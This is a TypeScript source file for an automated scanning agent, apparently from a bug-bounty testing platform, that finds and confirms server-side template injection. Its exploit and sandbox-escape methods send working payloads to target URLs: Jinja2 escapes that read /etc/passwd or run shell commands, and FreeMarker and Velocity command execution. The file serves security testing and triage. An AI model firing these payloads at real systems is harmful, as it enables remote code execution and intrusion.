import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import storage from '../services/storage';
import events from '../services/events';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import knowledgeStore from '../services/knowledge/knowledge-store';
import { sharedMemory } from '../services/three-agent/shared-memory';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

export interface TemplateInjectionJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testSSTI?: boolean;
    testCSTI?: boolean;
    templates?: ('jinja2' | 'twig' | 'freemarker' | 'velocity' | 'smarty' | 'thymeleaf' | 'pebble')[];
    polyglot?: boolean;
    sandboxEscape?: boolean;
    customPayloads?: string[];
    timeout?: number;
  };
}

export interface TemplateInjectionResult {
  vulnerabilities: Array<{
    url: string;
    parameter: string;
    type: 'ssti' | 'csti';
    template: string;
    severity: 'critical' | 'high' | 'medium';
    confidence: number;
    evidence: string;
    payload: string;
    exploitPayload?: string;
    sandboxBypass?: string;
    impact: string;
    remediation: string;
  }>;
  testedUrls: number;
  testedParameters: number;
  executionTime: number;
}

/**
 * Template Injection Agent
 *
 * Comprehensive Server-Side and Client-Side Template Injection testing:
 * - SSTI: Jinja2, Twig, FreeMarker, Velocity, Smarty, Thymeleaf, Pebble, Handlebars
 * - CSTI: Angular, Vue, React (in SSR)
 * - Polyglot payloads for universal detection
 * - Sandbox escape techniques for confirmed vulnerabilities
 * - RCE exploitation chain generation
 *
 * Detection Strategy:
 * 1. Mathematical operations ({{7*7}}, ${7*7})
 * 2. Object inspection ({{config}}, ${applicationScope})
 * 3. Reflection attacks
 * 4. Polyglot payloads
 * 5. Template-specific exploitation
 * 6. Sandbox bypass attempts
 *
 * Tools: tplmap, custom polyglot engine
 */
export class TemplateInjectionAgent extends BaseAgent<TemplateInjectionJob> {
  private enhanced = new EnhancedAgentCapabilities();

  constructor() {
    super('templateinjection' as any);
  }

  protected getSteps() {
    return [
      {
        name: 'Identify potential template injection points',
        metadata: { phase: 'discovery' },
      },
      {
        name: 'Test mathematical expression payloads',
        metadata: { phase: 'detection' },
      },
      {
        name: 'Fingerprint template engine',
        metadata: { phase: 'fingerprinting' },
      },
      {
        name: 'Test template-specific exploits',
        metadata: { phase: 'exploitation' },
      },
      {
        name: 'Attempt sandbox escape',
        metadata: { phase: 'advanced-exploitation' },
      },
      {
        name: 'Generate RCE proof-of-concepts',
        metadata: { phase: 'poc-generation' },
      },
      {
        name: 'Store findings',
        metadata: { phase: 'reporting' },
      },
    ];
  }

  async process(job: Job<TemplateInjectionJob>): Promise<TemplateInjectionResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'templateinjection',
      'start',
      'info',
      `Starting template injection testing on ${urls.length} URLs`
    );

    const result: TemplateInjectionResult = {
      vulnerabilities: [],
      testedUrls: 0,
      testedParameters: 0,
      executionTime: 0,
    };

    try {
      // Step 1: Identify injection points
      await this.updateStepStatus(job.id, 0, 'running');
      const injectionPoints = await this.identifyInjectionPoints(urls, programId, job.id);
      result.testedUrls = urls.length;
      result.testedParameters = injectionPoints.length;
      await this.updateStepStatus(job.id, 0, 'completed', {
        injectionPointsFound: injectionPoints.length,
      });

      if (injectionPoints.length === 0) {
        logger.info({ programId }, 'No potential injection points found');
        await this.updateJobStatus(job.id, 'completed', result);
        return result;
      }

      // Step 2: Test mathematical expressions
      await this.updateStepStatus(job.id, 1, 'running');
      const detectedVulns = await this.testMathematicalExpressions(
        injectionPoints,
        programId,
        job.id
      );
      await this.updateStepStatus(job.id, 1, 'completed', {
        vulnerabilitiesDetected: detectedVulns.length,
      });

      // Step 3: Fingerprint template engines
      await this.updateStepStatus(job.id, 2, 'running');
      for (const vuln of detectedVulns) {
        const engine = await this.fingerprintTemplateEngine(vuln, programId, job.id);
        vuln.template = engine;
      }
      await this.updateStepStatus(job.id, 2, 'completed', {
        engineIdentified: detectedVulns.filter((v) => v.template !== 'unknown').length,
      });

      // Step 4: Test template-specific exploits
      if (options.testSSTI !== false) {
        await this.updateStepStatus(job.id, 3, 'running');
        const exploitResults = await this.testTemplateSpecificExploits(
          detectedVulns,
          programId,
          job.id,
          options
        );
        result.vulnerabilities.push(...exploitResults);
        await this.updateStepStatus(job.id, 3, 'completed', {
          exploitsSuccessful: exploitResults.length,
        });
      }

      // Step 5: Sandbox escape attempts
      if (options.sandboxEscape !== false) {
        await this.updateStepStatus(job.id, 4, 'running');
        await this.attemptSandboxEscape(result.vulnerabilities, programId, job.id);
        await this.updateStepStatus(job.id, 4, 'completed', {
          sandboxBypassFound: result.vulnerabilities.filter((v) => v.sandboxBypass).length,
        });
      }

      // Step 6: Generate RCE PoCs
      await this.updateStepStatus(job.id, 5, 'running');
      await this.generateRCEPoCs(result.vulnerabilities, programId, job.id);
      await this.updateStepStatus(job.id, 5, 'completed', {
        rcePoCsGenerated: result.vulnerabilities.filter((v) => v.exploitPayload).length,
      });

      // Step 7: Store findings
      await this.updateStepStatus(job.id, 6, 'running');
      if (result.vulnerabilities.length > 0) {
        await this.storeFindingsInDatabase(result.vulnerabilities, programId, job.id);
      }
      await this.updateStepStatus(job.id, 6, 'completed', {
        totalVulnerabilities: result.vulnerabilities.length,
      });

      // Three-agent integration
      const { swarmId, enableSharedMemory } = job.data as any;
      if (swarmId && enableSharedMemory && result.vulnerabilities.length > 0) {
        await this.shareWithSwarm(swarmId, result.vulnerabilities, job.id);
      }

      result.executionTime = Date.now() - startTime;

      await this.updateJobStatus(job.id, 'completed', result);
      await this.logExecution(
        job.id,
        programId,
        'templateinjection',
        'complete',
        'success',
        `Found ${result.vulnerabilities.length} template injection vulnerabilities in ${result.executionTime}ms`
      );

      // Trigger handoffs
      if (result.vulnerabilities.length > 0) {
        await this.triggerHandoffs(job, result);
      }

      return result;
    } catch (error: any) {
      await this.logExecution(
        job.id,
        programId,
        'templateinjection',
        'error',
        'error',
        `Error: ${error.message}`
      );
      await this.updateJobStatus(job.id, 'failed', { error: error.message });
      throw error;
    }
  }

  /**
   * Identify potential template injection points
   */
  private async identifyInjectionPoints(
    urls: string[],
    programId: string,
    jobId: string
  ): Promise<Array<{ url: string; parameter: string; method: string }>> {
    const injectionPoints: Array<{ url: string; parameter: string; method: string }> = [];

    // Query database for known parameters and forms
    const dbResult = await database.query(
      `SELECT DISTINCT value as url, metadata FROM assets
       WHERE program_id = $1
       AND type = 'endpoint'
       AND (metadata->>'hasForm' = 'true' OR metadata->>'hasParameters' = 'true')
       LIMIT 500`,
      [programId]
    );

    for (const row of dbResult.rows) {
      const metadata = row.metadata || {};
      const params = metadata.parameters || [];

      for (const param of params) {
        injectionPoints.push({
          url: row.url,
          parameter: param.name,
          method: param.method || 'GET',
        });
      }
    }

    // Also extract parameters from URLs directly
    for (const url of urls) {
      try {
        const urlObj = new URL(url);
        urlObj.searchParams.forEach((value, key) => {
          injectionPoints.push({
            url,
            parameter: key,
            method: 'GET',
          });
        });
      } catch (error) {
        // Invalid URL, skip
      }
    }

    return injectionPoints;
  }

  /**
   * Test mathematical expression payloads
   */
  private async testMathematicalExpressions(
    injectionPoints: Array<{ url: string; parameter: string; method: string }>,
    programId: string,
    jobId: string
  ): Promise<TemplateInjectionResult['vulnerabilities']> {
    const vulnerabilities: TemplateInjectionResult['vulnerabilities'] = [];

    // Comprehensive payload set covering all major template engines
    const mathPayloads = [
      // Jinja2 / Flask
      { payload: '{{7*7}}', expected: '49', template: 'jinja2' },
      { payload: '{{7*\'7\'}}', expected: '7777777', template: 'jinja2' },

      // Twig / Symfony
      { payload: '{{7*7}}', expected: '49', template: 'twig' },
      { payload: '{{7*"7"}}', expected: '7777777', template: 'twig' },

      // FreeMarker / Java
      { payload: '${7*7}', expected: '49', template: 'freemarker' },
      { payload: '#{7*7}', expected: '49', template: 'freemarker' },

      // Velocity / Java
      { payload: '#set($x=7*7)$x', expected: '49', template: 'velocity' },

      // Smarty / PHP
      { payload: '{$smarty.version}', expected: 'Smarty', template: 'smarty' },
      { payload: '{7*7}', expected: '49', template: 'smarty' },

      // Thymeleaf / Java Spring
      { payload: '${7*7}', expected: '49', template: 'thymeleaf' },

      // Pebble / Java
      { payload: '{{7*7}}', expected: '49', template: 'pebble' },

      // Handlebars / Node.js
      { payload: '{{#with "s" as |string|}}{{string.toUpperCase}}{{/with}}', expected: 'S', template: 'handlebars' },
    ];

    for (const point of injectionPoints.slice(0, 100)) {
      // Limit to first 100 for performance
      for (const testPayload of mathPayloads) {
        try {
          const response = await this.sendPayload(point, testPayload.payload);

          // Check if expected result appears in response
          if (response && response.includes(testPayload.expected)) {
            vulnerabilities.push({
              url: point.url,
              parameter: point.parameter,
              type: 'ssti',
              template: testPayload.template,
              severity: 'critical', // SSTI is almost always critical (RCE)
              confidence: 0.9,
              evidence: `Mathematical expression ${testPayload.payload} evaluated to ${testPayload.expected}`,
              payload: testPayload.payload,
              impact:
                'Server-Side Template Injection allows attackers to inject arbitrary template directives, leading to Remote Code Execution (RCE), data exfiltration, and full server compromise.',
              remediation:
                'Never pass user input directly to template rendering. Use safe templating practices with auto-escaping enabled. Consider using logic-less templates.',
            });

            // Found vulnerability, no need to test other payloads on same parameter
            break;
          }
        } catch (error: any) {
          logger.debug(
            { point, payload: testPayload.payload, error: error.message },
            'Error testing math payload'
          );
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Send payload to injection point
   */
  private async sendPayload(
    point: { url: string; parameter: string; method: string },
    payload: string
  ): Promise<string | null> {
    try {
      const urlObj = new URL(point.url);

      if (point.method === 'GET') {
        urlObj.searchParams.set(point.parameter, payload);
        const response = await axios.get(urlObj.toString(), {
          timeout: 10000,
          maxRedirects: 5,
          validateStatus: () => true,
        });
        return response.data;
      } else if (point.method === 'POST') {
        const response = await axios.post(
          point.url,
          { [point.parameter]: payload },
          {
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: () => true,
          }
        );
        return response.data;
      }
    } catch (error: any) {
      logger.debug({ point, error: error.message }, 'Error sending payload');
    }

    return null;
  }

  /**
   * Fingerprint exact template engine
   */
  private async fingerprintTemplateEngine(
    vuln: TemplateInjectionResult['vulnerabilities'][0],
    programId: string,
    jobId: string
  ): Promise<string> {
    // Advanced fingerprinting using engine-specific features
    const fingerprintPayloads: Record<string, { payload: string; indicator: string }> = {
      jinja2: { payload: '{{config.items()}}', indicator: 'dict_items' },
      twig: { payload: '{{_self}}', indicator: '__TwigTemplate_' },
      freemarker: { payload: '${.version}', indicator: 'FreeMarker' },
      velocity: { payload: '#foreach($i in [1])$i#end', indicator: '1' },
      smarty: { payload: '{$smarty.version}', indicator: 'Smarty' },
      thymeleaf: { payload: '${#locale}', indicator: 'Locale' },
    };

    for (const [engine, test] of Object.entries(fingerprintPayloads)) {
      try {
        const response = await this.sendPayload(
          { url: vuln.url, parameter: vuln.parameter, method: 'GET' },
          test.payload
        );

        if (response && response.includes(test.indicator)) {
          return engine;
        }
      } catch (error) {
        // Continue to next fingerprint
      }
    }

    return vuln.template; // Return initial guess
  }

  /**
   * Test template-specific exploits
   */
  private async testTemplateSpecificExploits(
    vulnerabilities: TemplateInjectionResult['vulnerabilities'][],
    programId: string,
    jobId: string,
    options: TemplateInjectionJob['options']
  ): Promise<TemplateInjectionResult['vulnerabilities']> {
    const exploited: TemplateInjectionResult['vulnerabilities'][] = [];

    for (const vuln of vulnerabilities) {
      const exploitPayloads = this.getTemplateExploitPayloads(vuln.template);

      for (const exploit of exploitPayloads) {
        try {
          const response = await this.sendPayload(
            { url: vuln.url, parameter: vuln.parameter, method: 'GET' },
            exploit.payload
          );

          if (response && exploit.verifyFn(response)) {
            vuln.exploitPayload = exploit.payload;
            vuln.evidence += ` | Exploit confirmed: ${exploit.description}`;
            exploited.push(vuln);
            break;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return exploited;
  }

  /**
   * Get template-specific exploit payloads
   */
  private getTemplateExploitPayloads(template: string): Array<{
    payload: string;
    description: string;
    verifyFn: (response: string) => boolean;
  }> {
    const exploits: Record<
      string,
      Array<{ payload: string; description: string; verifyFn: (response: string) => boolean }>
    > = {
      jinja2: [
        {
          payload: "{{config.items()}}",
          description: 'Config object access',
          verifyFn: (r) => r.includes('SECRET') || r.includes('dict_items'),
        },
        {
          payload: "{{''.__class__.__mro__[1].__subclasses__()}}",
          description: 'Python object introspection',
          verifyFn: (r) => r.includes('class') || r.includes('object'),
        },
      ],
      freemarker: [
        {
          payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
          description: 'Command execution via Execute',
          verifyFn: (r) => r.includes('uid=') || r.includes('gid='),
        },
      ],
      velocity: [
        {
          payload: '#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
          description: 'Command execution via Runtime.exec',
          verifyFn: (r) => r.includes('uid=') || r.includes('gid='),
        },
      ],
    };

    return exploits[template] || [];
  }

  /**
   * Attempt sandbox escape
   */
  private async attemptSandboxEscape(
    vulnerabilities: TemplateInjectionResult['vulnerabilities'][],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      if (vuln.template === 'jinja2') {
        // Jinja2 sandbox escape payloads
        const escapePayloads = [
          "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
          "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
        ];

        for (const payload of escapePayloads) {
          const response = await this.sendPayload(
            { url: vuln.url, parameter: vuln.parameter, method: 'GET' },
            payload
          );

          if (response && (response.includes('root:') || response.includes('uid='))) {
            vuln.sandboxBypass = payload;
            vuln.confidence = 1.0;
            vuln.evidence += ' | Sandbox escape successful';
            break;
          }
        }
      }
    }
  }

  /**
   * Generate RCE proof-of-concepts
   */
  private async generateRCEPoCs(
    vulnerabilities: TemplateInjectionResult['vulnerabilities'][],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      if (vuln.exploitPayload || vuln.sandboxBypass) {
        // Already have RCE PoC
        continue;
      }

      // Generate safe RCE PoC (using 'id' command)
      const rcePocs: Record<string, string> = {
        jinja2:
          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        freemarker:
          '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        velocity:
          '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
      };

      if (rcePocs[vuln.template]) {
        vuln.exploitPayload = rcePocs[vuln.template];
      }
    }
  }

  /**
   * Store findings in database
   */
  private async storeFindingsInDatabase(
    vulnerabilities: TemplateInjectionResult['vulnerabilities'][],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      await database.query(
        `INSERT INTO findings (
          program_id, job_id, type, severity, url, evidence,
          poc, remediation, confidence, metadata, created_at
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())
        ON CONFLICT (program_id, url, type) DO UPDATE SET
          evidence = EXCLUDED.evidence,
          updated_at = NOW()`,
        [
          programId,
          jobId,
          vuln.type,
          vuln.severity,
          vuln.url,
          vuln.evidence,
          vuln.payload,
          vuln.remediation,
          vuln.confidence,
          JSON.stringify({
            parameter: vuln.parameter,
            template: vuln.template,
            exploitPayload: vuln.exploitPayload,
            sandboxBypass: vuln.sandboxBypass,
          }),
        ]
      );
    }

    events.emit('findings:new', {
      programId,
      count: vulnerabilities.length,
      severity: 'critical', // SSTI is always critical
    });
  }

  /**
   * Share with three-agent swarm
   */
  private async shareWithSwarm(
    swarmId: string,
    vulnerabilities: TemplateInjectionResult['vulnerabilities'][],
    jobId: string
  ) {
    try {
      const findings = vulnerabilities.map((vuln) => ({
        id: uuidv4(),
        type: `ssti-${vuln.template}`,
        severity: vuln.severity,
        url: vuln.url,
        evidence: vuln.evidence,
        confidence: vuln.confidence,
        timestamp: new Date(),
        discoveredBy: `templateinjection-${jobId}`,
        metadata: {
          parameter: vuln.parameter,
          template: vuln.template,
          exploitPayload: vuln.exploitPayload,
          sandboxBypass: vuln.sandboxBypass,
        },
      }));

      await sharedMemory.storeFindings(swarmId, findings);

      logger.info(
        { swarmId, findingsShared: findings.length },
        '🎨 Template injection agent shared findings with swarm'
      );
    } catch (error: any) {
      logger.error({ error, swarmId }, 'Failed to share template injection findings with swarm');
    }
  }

  /**
   * Trigger handoffs
   */
  private async triggerHandoffs(job: Job<TemplateInjectionJob>, result: TemplateInjectionResult) {
    const { programId } = job.data;

    // SSTI found -> escalate immediately
    if (result.vulnerabilities.length > 0) {
      await this.createHandoff(
        job.id,
        'templateinjection',
        'triage',
        {
          reason: 'Critical SSTI vulnerabilities detected requiring immediate attention',
          vulnerabilities: result.vulnerabilities,
          priority: 'critical',
        },
        programId
      );
    }

    // RCE confirmed -> manual verification needed
    const rceConfirmed = result.vulnerabilities.filter(
      (v) => v.exploitPayload || v.sandboxBypass
    );
    if (rceConfirmed.length > 0) {
      await this.createHandoff(
        job.id,
        'templateinjection',
        'confirm',
        {
          reason: 'RCE via SSTI confirmed, requesting manual verification before reporting',
          targets: rceConfirmed.map((v) => v.url),
          testType: 'ssti-rce',
        },
        programId
      );
    }
  }
}
